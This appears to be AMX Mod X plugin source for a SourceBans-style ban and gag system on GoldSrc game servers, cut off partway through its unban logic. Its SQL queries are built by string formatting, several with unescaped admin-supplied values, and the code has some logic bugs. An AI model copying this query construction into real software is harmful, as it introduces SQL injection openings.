//------------------
//	Include Files
//------------------
#pragma semicolon 1

#include <amxmodx>
#include <amxmisc>
#include <geoip>
#include <fakemeta>
#include <sqlx>
#include <fun>

// Plugin
#define PLUGIN					"GoldSrcBans"
#define AUTHOR					"JonnyBoy0719, Aoi.Kagase"
#define VERSION					"2.0"
#define MaxClients				32

#define MAX_ERR_LENGTH			512
#define MAX_QUERY_LENGTH		2048
#define MAX_LENGTH				128
#define IsConsole(%1)			(%1 == 0)
enum DB_CONFIG
{
	DB_HOST,
	DB_USER,
	DB_PASS,
	DB_TYPE,
	DB_NAME,
	DB_PREFIX,
}

// MySQL
//Database Handles
new Handle:g_dbTaple;
new Handle:g_dbConnect;
new g_dbConfig		[DB_CONFIG][MAX_LENGTH];
new g_dbError		[MAX_ERR_LENGTH];
new sql_cache		[MAX_QUERY_LENGTH + 1];
new g_ip			[MAX_PLAYERS + 1][MAX_IP_WITH_PORT_LENGTH];
new g_authid		[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];
new g_authid_right 	[MAX_PLAYERS + 1][MAX_AUTHID_LENGTH];

new const SQL_GAG_INSERT[] = 
"INSERT INTO %s_comms (authid, name, created, ends, length, reason, aid, adminIp, sid, type) \
	 VALUES ('%s', '%s', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', IFNULL((SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '0'), '%s', %d, %d)";
new const SQL_UNBAN_SELECT_FROM_STEAMID[] =
"SELECT bid FROM %s_bans WHERE (type = 0 AND authid = '%s') AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL";
new const SQL_UNBAN_SELECT_FROM_IP[] =
"SELECT bid FROM %s_bans WHERE (type = 1 AND ip = '%s')     AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL";
new const SQL_UNBAN_UPDATE[]=
"UPDATE %s_bans SET RemovedBy = (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), RemoveType = 'U', RemovedOn = UNIX_TIMESTAMP(), ureason = '%s' WHERE bid = %d";
new WebsiteAddress[128],
	serverID = -1,
	bool:HasLoadedBans = false,
	bool:HasLoadedGags = false;

new ServerIP[24],
	ServerPort[7];

// Player Gag
new bool:gag_chat[33],
	bool:gag_voice[33];

//------------------
//	plugin_init()
//------------------

public plugin_init()
{
	register_plugin	 (PLUGIN, VERSION, AUTHOR);
	register_cvar	 ("amx_goldsrcbans_version", VERSION, FCVAR_SPONLY|FCVAR_SERVER);
	set_cvar_string	 ("amx_goldsrcbans_version", VERSION);
	check_plugin();

	// SQL Cvar Setup
	bind_pcvar_string(create_cvar ("sourcebans_host", 	"127.0.0.1"), 	g_dbConfig[DB_HOST], 	charsmax(g_dbConfig[])); // The host from the db
	bind_pcvar_string(create_cvar ("sourcebans_user", 	"sourcebans"), 	g_dbConfig[DB_USER], 	charsmax(g_dbConfig[])); // The username from the db login
	bind_pcvar_string(create_cvar ("sourcebans_pass", 	"sourcebans"),	g_dbConfig[DB_PASS], 	charsmax(g_dbConfig[])); // The password from the db password
	bind_pcvar_string(create_cvar ("sourcebans_type", 	"mysql"),		g_dbConfig[DB_TYPE], 	charsmax(g_dbConfig[])); // The password from the db type
	bind_pcvar_string(create_cvar ("sourcebans_dbname", "sourcebans"),	g_dbConfig[DB_NAME], 	charsmax(g_dbConfig[])); // The database name
	bind_pcvar_string(create_cvar ("sourcebans_prefix", "sb"),			g_dbConfig[DB_PREFIX], 	charsmax(g_dbConfig[])); // The database prefix

	// Ban System
	register_concmd	 ("amx_ban", 	"CmdBanPlayer", 		ADMIN_BAN, "<#userid|name> <time> <timetype> [reason]");
	register_concmd	 ("amx_banip", 	"CmdBanPlayerIP", 		ADMIN_BAN, "<ip> <time> <timetype> [reason]");
	register_concmd	 ("amx_addban",	"CmdBanPlayerSteamID", 	ADMIN_BAN, "<time> <timetype> <steamid> [reason]");
	register_concmd	 ("amx_unban", 	"CmdUnBanPlayer", 		ADMIN_BAN, "<steamid|ip> [reason]");

	// Voice com and chat bans
	register_concmd	 ("amx_gag", 	"CmdGagPlayer", 		ADMIN_BAN, "<#userid|name> <time> <timetype> <type> [reason]");
	register_concmd	 ("amx_ungag", 	"CmdUnGagPlayer", 		ADMIN_BAN, "<#userid|name> <type> [reason]");

	// Client commands
	register_clcmd("say","say_hook");
	register_clcmd("say_team","say_hook");

	// Forwarding
	register_forward(FM_Voice_SetClientListening, "VoiceSetClientListening");

	CheckSourceBansFile();
}

//------------------
//	VoiceSetClientListening()
//------------------
public VoiceSetClientListening(receiver, sender, bool:bListen)
{
	if (!is_user_connected(receiver) || !is_user_connected(sender))
    	return FMRES_IGNORED;
	
	if (gag_voice[sender])
	{
		engfunc(EngFunc_SetClientListening, receiver, sender, 0);
		return FMRES_SUPERCEDE;
	}

	return FMRES_IGNORED;
}

//------------------
//	CmdGagPlayer()
//------------------
public CmdGagPlayer(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new szUserId	[32];	// <#userid|name|steamid>
	new	szTime		[32];	// <time>
	new	szTimeType	[32];	// <timetype>
	new	szGagType	[32];	// <0|1|2>
	new	szReason	[125];	// [reason]

	read_argv(1, szUserId, 	charsmax(szUserId));
	read_argv(2, szTime, 	charsmax(szTime));
	read_argv(3, szTimeType,charsmax(szTimeType));
	read_argv(4, szGagType, charsmax(szGagType));
	read_argv(5, szReason, 	charsmax(szReason));

	new iTimeType = str_to_num(szTimeType);
	new	iTime 	  = str_to_num(szTime);
	new	szTimeTypeMsg[32] = "";

	if (!access(id, ADMIN_LEVEL_A))
	{
		client_print(id, print_console, "You do not have access to gag permanently.");
		return PLUGIN_HANDLED;
	}

	if (!CheckAccessOneWeek(id, iTimeType, iTime, "gag", szTimeTypeMsg, charsmax(szTimeTypeMsg)))
		return PLUGIN_HANDLED;

	new player = cmd_target(id, szUserId, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);
	if (!player)
	{
		client_print(id, print_console, "Player ^"%s^" was not found!", szUserId);
		return PLUGIN_HANDLED;
	}

	new iGagType = str_to_num(szGagType);

	if (iGagType < 0 || iGagType > 2)
	{
		client_print(id, print_console, "allowed types are:");
		client_print(id, print_console, "0 - silence");
		client_print(id, print_console, "1 - mute");
		client_print(id, print_console, "2 - gag");
		return PLUGIN_HANDLED;
	}

	GagPlayer(id, player, str_to_num(szTime), iTime, iGagType, szReason, szTimeTypeMsg, false);

	return PLUGIN_HANDLED;
}
//------------------
//	CmdUnGagPlayer()
//------------------

public CmdUnGagPlayer(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new szUserId	[32];	// <userid>
	new	szType		[32];	// <type>
	new	szReason	[125];	// [reason]

	read_argv(1, szUserId, 	charsmax(szUserId));
	read_argv(2, szType, 	charsmax(szType));
	read_argv(3, szReason, 	charsmax(szReason));

	// STEAM_ID or #id.
	new player = cmd_target(id, szUserId, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);

	if (!player)
	{
		client_print(id, print_console, "Player ^"%s^" was not found!", szUserId);
		return PLUGIN_HANDLED;
	}

	if (equali(szReason, ""))
		formatex(szReason, charsmax(szReason), "No Reason given.");

	UnGagPlayer(id, player, str_to_num(szType), szReason, false);

	return PLUGIN_HANDLED;
}

//------------------
//	CmdUnBanPlayer()
//------------------

public CmdUnBanPlayer(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new szSteamId[MAX_AUTHID_LENGTH];	// <steamid>
	new	szReason[125];					// [reason]
	new szName[32];

	read_argv(1, szSteamId, charsmax(szSteamId));
	read_argv(2, szReason, charsmax(szReason));

	get_user_name(id, szName, charsmax(szName));
	mysql_escape_string(szName, charsmax(szName));
	mysql_escape_string(szReason, charsmax(szReason));

	if (equali(szReason, ""))
		formatex(szReason, charsmax(szReason), "No Reason given.");

	if (containi(szSteamId, "STEAM_") != -1)
		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_SELECT_FROM_STEAMID, g_dbConfig[DB_PREFIX], szSteamId);
	else
		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_SELECT_FROM_IP, g_dbConfig[DB_PREFIX], szSteamId);

	new Handle:query = SQL_PrepareQuery(g_dbConnect, sql_cache);

	if (!SQL_Execute(query))
	{
		server_print("query not saved");
		SQL_QueryError(query, g_dbError, charsmax(g_dbError));
		server_print("[AMXX] %L", LANG_SERVER, "SQL_CANT_LOAD_ADMINS", g_dbError);
	}
	else if (SQL_NumResults(query) >= 1)
	{
		// Grab the bid
		new bid;
		new	sql_bid;

		bid = SQL_FieldNameToNum(query, "bid");

		while (SQL_MoreResults(query))
		{
			sql_bid = SQL_ReadResult(query, bid);
			SQL_NextRow(query);
		}

		formatex(sql_cache, charsmax(sql_cache), SQL_UNBAN_UPDATE, g_dbConfig[DB_PREFIX], g_dbConfig[DB_PREFIX], g_authid[id], g_authid_right[id], szReason, sql_bid);

		SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);
	}
	else
	{
		if (id && is_user_connected(id))
			client_print(id, print_chat, "No active bans found for that filter");
		else
			log_amx("No active bans found for that filter!");
	}
	get_user_name(id, szName, charsmax(szName));

	log_amx("GoldSrcBans CMD: ^"%N^" has unbanned ^"%s^" - reason: ^"%s^"", id, szSteamId, szReason);

	new formated_text[501];
	formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has unbanned ^"%s^" - reason: ^"%s^"", id, g_authid[id], szSteamId, szReason);
	PrintToAdmins(formated_text);

	SQL_FreeHandle(query);

	return PLUGIN_HANDLED;
}

//------------------
//	CmdBanPlayer()
//------------------

public CmdBanPlayer(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new szUserId	[32],	// <#userid|name|steamid>
		szTime		[32],	// <time>
		szTimeType	[32],	// <timetype>
		szReason	[125];	// [reason]

	read_argv(1, szUserId, 	charsmax(szUserId));
	read_argv(2, szTime, 	charsmax(szTime));
	read_argv(3, szTimeType,charsmax(szTimeType));
	read_argv(4, szReason, 	charsmax(szReason));
	
	new iTimeType 	= str_to_num(szTimeType),
		iTime 		= str_to_num(szTime),
		szTimeTypeMsg[32] = "";
	
	if (!access(id, ADMIN_LEVEL_A))
	{
		client_print(id, print_console, "You do not have access to ban permanently.");
		return PLUGIN_HANDLED;
	}

	if (!CheckAccessOneWeek(id, iTimeType, iTime, "ban", szTimeTypeMsg, charsmax(szTimeTypeMsg)))
		return PLUGIN_HANDLED;

	new player = cmd_target(id, szUserId, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF);
	if (!player)
	{
		client_print(id, print_console, "Player ^"%s^" was not found!", szUserId);
		return PLUGIN_HANDLED;
	}

	if (equali(szReason, ""))
		formatex(szReason, charsmax(szReason), "No Reason given.");

	new formated_text[501];

	if (IsConsole(id))
	{
		log_amx("GoldSrcBans CMD: ^"%N^" has been banned for %s %s - reason: ^"%s^"", player, str_to_num(szTime), szTimeTypeMsg, szReason);
		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has been banned for %d %s - reason: ^"%s^"", player, g_authid[player], str_to_num(szTime), szTimeTypeMsg, szReason);
		PrintToAdmins(formated_text);
		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has banned for %d %s - reason: ^"%s^"", player, str_to_num(szTime), szTimeTypeMsg, szReason);
		PrintToNonAdmin(formated_text);
	}
	else
	{
		log_amx("GoldSrcBans CMD: ^"%N^" has banned ^"%N^" for %d %s - reason: ^"%s^"", id, player, str_to_num(szTime), szTimeTypeMsg, szReason);
		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has banned ^"%n<%s>^" for %d %s - reason: ^"%s^"", id, g_authid[id], player, g_authid[player], str_to_num(szTime), szTimeTypeMsg, szReason);
		PrintToAdmins(formated_text);
		format(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has banned ^"%n^" for %d %s - reason: ^"%s^"", id, player, str_to_num(szTime), szTimeTypeMsg, szReason);
		PrintToNonAdmin(formated_text);
	}

	BanPlayer(id, player, iTime, szReason);

	return PLUGIN_HANDLED;
}



//------------------
//	CmdBanPlayerIP()
//------------------

public CmdBanPlayerIP(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new arg[32],	// <ip>
		arg2[32],	// <time>
		arg3[32],	// <timetype>
		arg4[125];	// [reason]

	read_argv(1, arg, 31);
	read_argv(2, arg2, 31);
	read_argv(3, arg3, 31);
	read_argv(4, arg4, 124);

	new timetype = str_to_num(arg3),
		timetypeSTR[32] = "";

	if ( timetype == -1 || timetype > 3 )
	{
		client_print(id, print_console, "Available time types are:");
		client_print(id, print_console, "0 - minutes");
		client_print(id, print_console, "1 - hours");
		client_print(id, print_console, "2 - days");
		client_print(id, print_console, "3 - weeks");
		return PLUGIN_HANDLED;
	}

	switch( timetype )
	{
		case 0:
			timetypeSTR = "minute(s)";
		case 1:
			timetypeSTR = "hour(s)";
		case 2:
			timetypeSTR = "day(s)";
		case 3:
			timetypeSTR = "week(s)";
	}

	if (equali(arg4, ""))
		arg4 = "No Reason given.";

	new time = str_to_num(arg2);

	new Handle:query = SQL_PrepareQuery(g_dbConnect, "SELECT bid FROM %s_bans WHERE type = 1 AND ip = '%s' AND (length = 0 OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], arg);

	if (!SQL_Execute(query))
	{
		server_print("query not saved");
		SQL_QueryError(query, g_dbError, charsmax(g_dbError));
		server_print("[AMXX] %L", LANG_SERVER, "SQL_CANT_LOAD_ADMINS", g_dbError);
	} else {
		if (id && is_user_connected(id))
			client_print(id, print_chat, "%s is already banned!", arg);
		else
			log_amx("%s is already banned!", arg);
	}

	new Name[32],
		adminAuth[64],
		adminIp[64];

	get_user_name(id, Name, 31);
	get_user_authid(id, adminAuth, 63);
	get_user_ip(id, adminIp, 63);

	replace_all( Name, 2500, "`", "\`");
	replace_all( Name, 2500, "'", "\'");

	replace_all( arg4, 2500, "`", "\`");
	replace_all( arg4, 2500, "'", "\'");

	// Lets setup the time
	switch( timetype )
	{
		case 1:
			time = (time * 60); // Hours
		case 2:
			time = (time * 60 * 24); // Days
		case 3:
			time = (time * 60 * 24 * 7); // Weeks
	}

	if (serverID == -1)
	{
		formatex(sql_cache, sizeof(sql_cache), "INSERT INTO %s_bans (type, ip, name, created, ends, length, reason, aid, adminIp, sid, country) VALUES \
						(1, '%s', '', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '%s', \
						(SELECT sid FROM %s_servers WHERE ip = '%s' AND port = '%s' LIMIT 0,1), ' ')", 
			g_dbConfig[DB_PREFIX], arg, (time * 60), (time * 60), arg4, g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], adminIp, g_dbConfig[DB_PREFIX], ServerIP, ServerPort);
	} else {
		formatex(sql_cache, sizeof(sql_cache), "INSERT INTO %s_bans (type, ip, name, created, ends, length, reason, aid, adminIp, sid, country) VALUES \
						(1, '%s', '', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '%s', \
						%d, ' ')", 
			g_dbConfig[DB_PREFIX], arg, (time * 60), (time * 60), arg4, g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], adminIp, serverID);
	}

	if( time == 0 )
		timetypeSTR = "permanently";

	SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);

	log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" banned the ip ^"%s^" for %d %s - reason: %s", Name, get_user_userid(id), adminAuth, arg, time, timetypeSTR, arg4);

	new formated_text[501];
	format(formated_text, 500, "[SourceBans] ^"%s<%s>^" banned the ip ^"%s^" for %d %s - reason: %s", Name, adminAuth, arg, time, timetypeSTR, arg4);
	PrintToAdmins(formated_text);
	format(formated_text, 500, "[SourceBans] ^"%s^" banned the ip ^"%s^" for %d %s - reason: %s", Name, arg, time, timetypeSTR, arg4);
	PrintToNonAdmin(formated_text);

	SQL_FreeHandle(query);

	return PLUGIN_HANDLED;
}

//------------------
//	CmdBanPlayerSteamID()
//------------------

public CmdBanPlayerSteamID(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED;

	new arg[32],	// <time>
		arg1[32],	// <timetype>
		arg2[32],	// <steamid>
		arg3[125];	// [reason]

	read_argv(1, arg, 31);
	read_argv(2, arg1, 31);
	read_argv(3, arg2, 31);
	read_argv(4, arg3, 124);

	new timetype = str_to_num(arg1),
		timetypeSTR[32] = "";

	if ( timetype == -1 || timetype > 3 )
	{
		client_print(id, print_console, "Available time types are:");
		client_print(id, print_console, "0 - minutes");
		client_print(id, print_console, "1 - hours");
		client_print(id, print_console, "2 - days");
		client_print(id, print_console, "3 - weeks");
		return PLUGIN_HANDLED;
	}

	switch( timetype )
	{
		case 0:
			timetypeSTR = "minute(s)";
		case 1:
			timetypeSTR = "hour(s)";
		case 2:
			timetypeSTR = "day(s)";
		case 3:
			timetypeSTR = "week(s)";
	}

	if (equali(arg3, ""))
		arg3 = "No Reason given.";

	new Handle:query = SQL_PrepareQuery(g_dbConnect, "SELECT bid FROM %s_bans WHERE type = 0 AND authid = '%s' AND (length = 0 OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], arg2);

	if (!SQL_Execute(query))
	{
		server_print("query not saved");
		SQL_QueryError(query, g_dbError, charsmax(g_dbError));
		server_print("[AMXX] %L", LANG_SERVER, "SQL_CANT_LOAD_ADMINS", g_dbError);
	} else {
		if (id && is_user_connected(id))
			client_print(id, print_chat, "%s is already banned!", arg2);
		else
			log_amx("%s is already banned!", arg2);
	}
	
	new time = str_to_num(arg);

	new Name[32],
		adminAuth[64],
		adminIp[64];

	get_user_name(id, Name, 31);
	get_user_authid(id, adminAuth, 63);
	get_user_ip(id, adminIp, 63);

	replace_all( Name, 2500, "`", "\`");
	replace_all( Name, 2500, "'", "\'");

	replace_all( arg3, 2500, "`", "\`");
	replace_all( arg3, 2500, "'", "\'");

	// Lets setup the time
	switch( timetype )
	{
		case 1:
			time = (time * 60); // Hours
		case 2:
			time = (time * 60 * 24); // Days
		case 3:
			time = (time * 60 * 24 * 7); // Weeks
	}

	if (serverID == -1)
	{
		formatex(sql_cache, sizeof(sql_cache), "INSERT INTO %s_bans (authid, name, created, ends, length, reason, aid, adminIp, sid, country) VALUES \
						('%s', '', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '%s', \
						(SELECT sid FROM %s_servers WHERE ip = '%s' AND port = '%s' LIMIT 0,1), ' ')", 
			g_dbConfig[DB_PREFIX], arg2, (time * 60), (time * 60), arg3, g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], adminIp, g_dbConfig[DB_PREFIX], ServerIP, ServerPort);
	} else {
		formatex(sql_cache, sizeof(sql_cache), "INSERT INTO %s_bans (authid, name, created, ends, length, reason, aid, adminIp, sid, country) VALUES \
						('%s', '', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', (SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'), '%s', \
						%d, ' ')", 
			g_dbConfig[DB_PREFIX], arg2, (time * 60), (time * 60), arg3, g_dbConfig[DB_PREFIX], adminAuth, adminAuth[8], adminIp, serverID);
	}

	SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);

	if( time == 0 )
		timetypeSTR = "permanently";

	log_amx("GoldSrcBans CMD: ^"%s<%d><%s><>^" banned the SteamID ^"%s^" for %d %s - reason: %s", Name, get_user_userid(id), adminAuth, arg2, time, timetypeSTR, arg3);

	new formated_text[501];
	format(formated_text, 500, "[SourceBans] ^"%s<%s>^" banned the SteamID ^"%s^" for %d %s - reason: %s", Name, adminAuth, arg2, time, timetypeSTR, arg3);
	PrintToAdmins(formated_text);
	format(formated_text, 500, "[SourceBans] ^"%s^" banned the SteamID ^"%s^" for %d %s - reason: %s", Name, arg2, time, timetypeSTR, arg3);
	PrintToNonAdmin(formated_text);

	SQL_FreeHandle(query);

	return PLUGIN_HANDLED;
}

//------------------
//	plugin_cfg()
//------------------

public plugin_cfg()
{
	// Lets delay the connection
	set_task( 2.3, "SQL_Init", 0 );

	// Grab the server IP and port
	get_cvar_string("ip", ServerIP, sizeof(ServerIP));
	get_cvar_string("port", ServerPort, sizeof(ServerPort));
}

//------------------
//	plugin_end()
//------------------

public plugin_end()
{
	// Lets close down the connection
	if (g_dbTaple)
		SQL_FreeHandle(g_dbTaple);
	if (g_dbConnect)
		SQL_FreeHandle(g_dbConnect);
}

//------------------
//	client_authorized()
//------------------

public client_authorized(id)
{
	if (IsValidClient(id))
	{
		CheckIfBanned	(id);
		get_user_authid	(id, g_authid[id], 	charsmax(g_authid[]));
		get_user_ip		(id, g_ip[id], 		charsmax(g_ip[]));
		formatex(g_authid_right[id], 		charsmax(g_authid_right),  g_authid[id][8]);
	}
}

//------------------
//	client_putinserver()
//------------------

public client_putinserver(id)
{
	CheckIfGagged(id);
}

//------------------
//	say_hook()
//------------------

public say_hook(id)
{
	if (gag_chat[id])
		return PLUGIN_HANDLED;
	return PLUGIN_CONTINUE;
}

//------------------
//	CheckSourceBansFile()
//------------------

public CheckSourceBansFile()
{
	new GetconfigsDir[64],
		configsDir[64];

	get_configsdir(GetconfigsDir, 63);
	formatex(configsDir, 63, "%s/goldsrcbans/settings.cfg", GetconfigsDir);

	if (!file_exists(configsDir))
	{
		server_print("[SourceBans] File ^"%s^" doesn't exist.", configsDir);
		return;
	}

	new File=fopen(configsDir,"r");
	if (File)
	{
		new ConfigString[512],
			CommandID[32],
			ValueID[32];

		while (!feof(File))
		{
			fgets(File, ConfigString, sizeof(ConfigString)-1);

			trim(ConfigString);

			// comment
			if (ConfigString[0]==';' || ConfigString[0]=='#' || (strlen(ConfigString) >= 2 && (ConfigString[0]=='/' && ConfigString[1]=='/')))
				continue;

			CommandID[0]=0;
			ValueID[0]=0;

			// not enough parameters
			if (parse(ConfigString, CommandID, sizeof(CommandID)-1, ValueID, sizeof(ValueID)-1) < 2)
				continue;

			trim(CommandID);
			trim(ValueID);

			if (equali(CommandID, "website"))
				WebsiteAddress = ValueID;

			if (equali(CommandID, "serverid"))
				serverID = str_to_num(ValueID);
		}
		fclose(File);
	}
}

//------------------
//	CheckIfBanned()
//------------------

stock CheckIfBanned(id)
{
	if (!id)
		return;

	new auth[64],
		ip[64];

	get_user_authid(id, auth, 63);
	get_user_ip(id, ip, 63);

	formatex( sql_cache, sizeof(sql_cache), "SELECT bid FROM %s_bans WHERE ((type = 0 AND authid REGEXP '^^STEAM_[0-9]:%s$') OR (type = 1 AND ip = '%s')) AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], auth[8], ip);
	new send_id[1];
	send_id[0] = id;

	SQL_ThreadQuery(g_dbTaple, "CheckBannedPlayer", sql_cache, send_id, 1);
}

//------------------
//	CheckIfGagged()
//------------------

stock CheckIfGagged(id)
{
	if (!id)
		return;

	new auth[64],
		ip[64];

	get_user_authid(id, auth, 63);
	get_user_ip(id, ip, 63);

	formatex( sql_cache, sizeof(sql_cache), "SELECT bid,type FROM %s_comms WHERE authid REGEXP '^^STEAM_[0-9]:%s$' AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], auth[8], ip);
	new send_id[1];
	send_id[0] = id;

	SQL_ThreadQuery(g_dbTaple, "CheckGaggedPlayers", sql_cache, send_id, 1);
}

//------------------
//	BanPlayer()
//------------------

stock BanPlayer(admin, victim, time, banReason[])
{
	if (!admin && admin > 0)
		return;

	if (!victim)
		return;

	new AdminAuthid[64],
		AdminName[32],
		Name[32],
		Ip[64],
		Authid[64],
		AdminIp[64];

	replace_all( banReason, 2500, "`", "\`");
	replace_all( banReason, 2500, "'", "\'");

	if (!IsConsole(admin))
	{
		get_user_name(admin, AdminName, 31);
		get_user_authid(admin, AdminAuthid, 63);
		get_user_ip(admin, AdminIp, 63);
	}
	else
	{
		AdminName = "Console";
		AdminAuthid = "";
		AdminIp = ServerIP;
	}

	get_user_name(victim, Name, 31);
	get_user_authid(victim, Authid, 63);
	get_user_ip(victim, Ip, 63);

	replace_all( Name, 2500, "`", "\`");
	replace_all( Name, 2500, "'", "\'");

	replace_all( AdminName, 2500, "`", "\`");
	replace_all( AdminName, 2500, "'", "\'");

	formatex( sql_cache, sizeof(sql_cache), "INSERT INTO %s_bans (ip, authid, name, created, ends, length, reason, aid, adminIp, sid, country) VALUES \
					('%s', '%s', '%s', UNIX_TIMESTAMP(), UNIX_TIMESTAMP() + %d, %d, '%s', IFNULL((SELECT aid FROM %s_admins WHERE authid = '%s' OR authid REGEXP '^^STEAM_[0-9]:%s$'),'0'), '%s', \
					(SELECT sid FROM %s_servers WHERE ip = '%s' AND port = '%s' LIMIT 0,1), ' ')", 
		g_dbConfig[DB_PREFIX], Ip, Authid, Name, (time * 60), (time * 60), banReason, g_dbConfig[DB_PREFIX], AdminAuthid, AdminAuthid[8], AdminIp, g_dbConfig[DB_PREFIX], ServerIP, ServerPort);

	SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);

	server_cmd("kick #%d ^"%s^"", get_user_userid(victim), banReason);
}

//------------------
//	GagPlayer()
//------------------

stock GagPlayer(admin, victim, timereal, time, type, banReason[], GagStringSetup[], bool:IsSilence)
{
	if (!victim)
		return;

	new type_sql = type;

	new	szVictimName	[MAX_NAME_LENGTH];
	new	szTypeName		[64];
	new	szTimeString	[64];
	new szReason		[125];

	formatex(szReason, charsmax(szReason), banReason);
	mysql_escape_string(szReason, 		charsmax(szReason));

	get_user_name(victim, szVictimName, charsmax(szVictimName));
	mysql_escape_string(szVictimName, 	charsmax(szVictimName));

	if (type_sql == 0)
		type_sql = 1;

	formatex(sql_cache, charsmax(sql_cache), SQL_GAG_INSERT, 
			g_dbConfig[DB_PREFIX], 
			g_authid[victim], 
			szVictimName,
			(time * 60), 
			(time * 60), 
			szReason, 
			g_dbConfig[DB_PREFIX], 
			(admin > 0) ? g_authid[admin] 		: "", 
			(admin > 0) ? g_authid_right[admin] : "", 
			(admin > 0) ? g_ip[admin] 			: ServerIP, 
			serverID, 
			type_sql
	);

	SQL_ThreadQuery(g_dbTaple, "QueryHandle", sql_cache);

	if (!IsSilence)
	{
		switch(type)
		{
			case 0:
			{
				formatex(szTypeName, charsmax(szTypeName), "silenced");
				gag_chat[victim] = true;
				gag_voice[victim] = true;
			}
			case 1:
			{
				formatex(szTypeName, charsmax(szTypeName), "muted");
				gag_voice[victim] = true;
			}
			case 2:
			{
				formatex(szTypeName, charsmax(szTypeName), "gagged");
				gag_chat[victim] = true;
			}
		}

		log_amx("GoldSrcBans CMD: ^"%N^" has %s ^"%N^" %s - reason: ^"%s^"", admin, szTypeName, victim, szTimeString, banReason);

		if (time == 0)
			formatex(szTimeString, charsmax(szTimeString), "permanently");
		else
			formatex(szTimeString, charsmax(szTimeString), "for %d %s", timereal, GagStringSetup);

		new formated_text[501];

		formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n<%s>^" has %s ^"%n<%s>^" %s - reason: ^"%s^"", admin, g_authid[admin], szTypeName, victim, g_authid[victim], szTimeString, banReason);
		PrintToAdmins(formated_text);

		formatex(formated_text, charsmax(formated_text), "[SourceBans] ^"%n^" has %s ^"%n^" %s - reason: ^"%s^"", admin, szTypeName, victim, szTimeString, banReason);
		PrintToNonAdmin(formated_text);

		// Lets gag on chat, if silence is on
		if (type == 0)
			GagPlayer(admin, victim, timereal, time, 2, banReason, GagStringSetup, true);
	}
}

//------------------
//	UnGagPlayer()
//------------------

stock UnGagPlayer(admin, victim, type, banMessage[], bool:IsSilence)
{
	new authid[32],
		authid2[32],
		TypeName[32],
		name[32],
		name2[32],
		type_sql;

	type_sql = type;

	get_user_authid(admin, authid, 31);
	get_user_authid(victim, authid2, 31);
	get_user_name(admin, name, 31);
	get_user_name(victim, name2, 31);

	if (type_sql == 0)
		type_sql = 1;

	formatex(sql_cache, charsmax(sql_cache), "SELECT bid FROM %s_comms WHERE (type = %d AND authid = '%s') AND (length = '0' OR ends > UNIX_TIMESTAMP()) AND RemoveType IS NULL", g_dbConfig[DB_PREFIX], type_sql, authid);

	new Handle:query = SQL_PrepareQuery(g_dbConnect, sql_cache);

	if (!SQL_Execute(query))
	{
		server_print("query not saved");
		SQL_QueryError(query, g_dbError, charsmax(g_dbError));
		server_print("[AMXX] %L", LANG_SERVER, "SQL_CANT_LOAD_ADMINS", g_dbError);
	}
	else if (SQL_NumResults(query) >= 1)
	{
		new Name[32],
			adminAuth[64],
			adminIp[64];

		get_user_name(admin, Name, 31);
		get_user_authid(admin, adminAuth, 63);
		get_user_ip(admin, adminIp, 63);

		replace_all( Name, 2500, "`", "\`");
		replace_all( Name, 2500, "'", "\'");

		replace_all( banMessage, 2500, "`", "\`");
		replace_all( banMessage, 2500, "'", "\'");

		// Grab the bid
		new bid,
			sql_bid;

		bid = SQL_FieldNameToNum(query, "bid");

		while (SQL_MoreResults(query))
		{
